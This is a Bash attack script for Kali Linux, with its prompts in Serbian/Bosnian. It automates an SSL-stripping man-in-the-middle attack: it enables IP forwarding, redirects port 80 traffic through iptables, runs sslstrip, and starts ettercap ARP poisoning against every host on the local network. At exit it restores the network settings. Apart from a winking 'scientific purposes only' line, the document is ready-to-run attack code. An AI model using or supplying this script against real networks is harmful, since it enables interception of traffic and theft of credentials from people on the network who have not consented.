echo
echo "////////////////////////////////////////////////"
echo "/                                              /"
echo "/            sslstrip + ettercap               /"
echo "/                                              /"
echo "/                 Kali-TRX                     /"
echo "/                                              /"
echo "/           Verzija skripta 1.0.0              /"
echo "/                                              /"
echo "////////////////////////////////////////////////"
echo
echo " Ovaj skript podesava sve potrbne parametre za pokretanje sslstrip-a i ettercap-a." 
echo " Skript je pisan za Kali Linux 1.0.9. Skript ce automatski postaviti ip_forward = 1,"
echo " iptables stavlja na odabran port. Pokrece sslstrip na odgovarajucem portu i pokrece"
echo " ettercap u text modu. "
echo
echo "Skrip koristiti samo za experimentalne ili naucne svrhe ;)"
echo
echo "[1] Dalje = d - Izlaz = x"
read dalje
if [ $dalje = "d" ] ; then
echo "1" > /proc/sys/net/ipv4/ip_forward
echo "/////////////"
echo "ip_forward"                    
cat /proc/sys/net/ipv4/ip_forward  
echo "/////////////"
echo
echo "[2] U sledecem koraku je potrebno upisati ime mreznog uredjaja (wlan0 - eth0) i broj porta (777)."
echo
echo "Mrezni uredjaj na kom ce sslstrip slusati."
read mrezna
echo
echo "Broj porta na kom ce sslstrip slusati."
read port
echo
iptables -t nat -A PREROUTING -i $mrezna -p tcp --destination-port 80 -j REDIRECT --to-port $port 
echo " iptables OK"
echo
xterm -bg black -fg orange -T sslstrip -e sslstrip -f -l $port & sslstripid=$!
echo 
xterm -bg black -fg orange -T ettercap -e ettercap -i $mrezna -T -q -M ARP:REMOTE // // output: & ettercapid=$!
fi
echo " sslstrip slusa na mreznom uredjaju $mrezna i portu $port, iptables su preusmjerene na port $port ."
echo
echo "Provjera iptables postavki"
echo
iptables -t nat -L -n -v
echo
echo "[3] Cestitam, sslstrip i ettercap uspjesno slusaju. :)"
echo
echo " Vrati sve na svoje mjesto i zatvori program."
echo
echo " Za izlaz x"
read izlaz
if [ $izlaz = "x" ] ; then
echo
echo "[+] Izlaz iz programa i vracanje sve na staro"
echo
kill ${sslstripid}
kill ${ettercapid}
echo
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo
echo "/////////////"
echo "ip_forward"                    
cat /proc/sys/net/ipv4/ip_forward  
echo "/////////////"
echo
iptables -t nat -L -n -v
echo
echo "[+] Ciscenje je uspijesno..."
echo "[+] Hvala na koriscenju skripta, VOZDRA..."
exit
fi
exit










